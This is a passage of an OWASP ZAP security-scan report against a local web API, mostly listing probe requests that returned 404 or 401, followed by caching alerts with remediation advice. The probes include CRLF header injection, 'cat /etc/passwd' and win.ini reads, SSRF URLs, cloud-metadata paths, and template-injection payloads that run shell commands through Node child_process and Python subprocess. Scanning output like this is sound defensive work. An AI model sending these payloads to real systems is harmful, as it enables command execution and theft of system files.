  * Node Name: `http://proxy:8080/api/mcp ()("any?\r\nSet-cookie: Tamper=84e3a428-32c8-405a-ac14-4f696277dd28\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("any\nSet-cookie: Tamper=84e3a428-32c8-405a-ac14-4f696277dd28")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("any\r\nSet-cookie: Tamper=84e3a428-32c8-405a-ac14-4f696277dd28")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("any\r\nSet-cookie: Tamper=84e3a428-32c8-405a-ac14-4f696277dd28\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("bVLINQKsdWuhEHdXafHPnJSmSneHZytZBUANTAZlBHusVwNUocsNByHWjZnRZfLLHpUudAQuYYIhVXFNatRnVMyNTvqiLvWtDrRCNlRpUugZimvcwSWjaPxZamgBxDosKPpWwpbFXmFqVMYBDbFXYjNOKWugdlryvQLvoBlrYufYeSQYRfTMIBCEIsDskgZvHdCVxjaYhgvuubsbNBwBYpJvtTpPMoGehZgJlqDBrhBKVGNXEdqSjdIXWuiTbLNjvYGpaqcfHGGgxLmCEIxXGVstdcdRpndimJsuJYIjDitNgipbPtbvNGSlvUmEiWwMxbJDlJTJTbLnGxyKrYRdblWHElEuryDfDFsGXFPFFQIVGJLPowMnlcMTBjTBhBQnhTiZxdSYgjuFuFxedSUSvAuFYqCiXDQOfIWKuxGDpynqvpWbtTTuKIQgOqkOlNFfKCfVeilYYEYGxtirdATZpakfFZCbjGBDrkYlqECpZBQCkPUXabChMUueXlGctlG)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("cat /etc/passwd")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("http://\\4900122706544996764.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("http://www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("http://www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("http://www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("http://www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("http://www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("https://4900122706544996764%2eowasp%2eorg")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("https://4900122706544996764.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("https://4900122706544996764.owasp.org/?John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("https://\\4900122706544996764.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("response.write(846,203*593,432)")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("system-property('xsl:vendor')/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj 3566*3995 zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj#set($x=5474*4763)${x}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj#{4048*1674}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj${8543*6003}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj<%=7540*4093%>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj<p th:text=\"${1888*5756}\"></p>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{#3197*9378}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{9476*6831}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{@3779*9309}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{@math key=\"4912\" method=\"multiply\" operand=\"6924\"/}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{{16190|add:78180}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{{2788*5815}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{{=3113*7374}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("zj{{print \"1613\" \"3907\"}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("{system(\"sleep 15\")}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"sleep 15\")}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("{{__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp
  * Node Name: `http://proxy:8080/api/mcp ()("{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\")\")()}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/mcp/
  * Node Name: `http://proxy:8080/api/mcp/ ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/api/media
  * Node Name: `http://proxy:8080/api/media ()(multipart:kind,attemptId,position,file)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/media/
  * Node Name: `http://proxy:8080/api/media/ ()(multipart:kind,attemptId,position,file)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/sync
  * Node Name: `http://proxy:8080/api/sync ()({answers:[],submits:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/sync/
  * Node Name: `http://proxy:8080/api/sync/ ()({answers:[],submits:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/request
  * Node Name: `http://proxy:8080/api/tts/request ()({clips:[{text,style}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/request/
  * Node Name: `http://proxy:8080/api/tts/request/ ()({clips:[{text,style}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: http://proxy:8080/metadata/instance
  * Node Name: `http://proxy:8080/metadata/instance`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/metadata/v1
  * Node Name: `http://proxy:8080/metadata/v1`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://proxy:8080/openstack/latest/meta_data.json
  * Node Name: `http://proxy:8080/openstack/latest/meta_data.json`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``


Instances: 157

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Non-Storable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.

* URL: http://proxy:8080/api/health
  * Node Name: `http://proxy:8080/api/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `no-store`
  * Other Info: ``
* URL: http://proxy:8080/api/media/id
  * Node Name: `http://proxy:8080/api/media/id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `no-store`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/today
  * Node Name: `http://proxy:8080/api/tts/today`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `no-store`
  * Other Info: ``
* URL: http://proxy:8080/api/sync
  * Node Name: `http://proxy:8080/api/sync ()({answers:[],submits:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `no-store`
  * Other Info: ``
* URL: http://proxy:8080/api/tts/request
  * Node Name: `http://proxy:8080/api/tts/request ()({clips:[{text,style}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `no-store`
  * Other Info: ``

Instances: Systemic


### Solution

The content may be marked as storable by ensuring that the following conditions are satisfied:
The request method must be understood by the cache and defined as being cacheable ("GET", "HEAD", and "POST" are currently defined as cacheable)
The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)
The "no-store" cache directive must not appear in the request or response header fields
For caching by "shared" caches such as "proxy" caches, the "private" response directive must not appear in the response
For caching by "shared" caches such as "proxy" caches, the "Authorization" header field must not appear in the request, unless the response explicitly allows it (using one of the "must-revalidate", "public", or "s-maxage" Cache-Control response directives)
In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:
It must contain an "Expires" header field
It must contain a "max-age" response directive
For "shared" caches such as "proxy" caches, it must contain a "s-maxage" response directive
It must contain a "Cache Control Extension" that allows it to be cached
It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3

### [ Storable and Cacheable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users. If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where "shared" caching servers such as "proxy" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.

* URL: http://proxy:8080/api/internal/weekly-report
  * Node Name: `http://proxy:8080/api/internal/weekly-report ()({orgId,learnerId,weekStart})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`


Instances: 1

### Solution

Validate that the response does not contain sensitive, personal or user-specific information. If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:
Cache-Control: no-cache, no-store, must-revalidate, private
Pragma: no-cache
Expires: 0
This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request.

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3


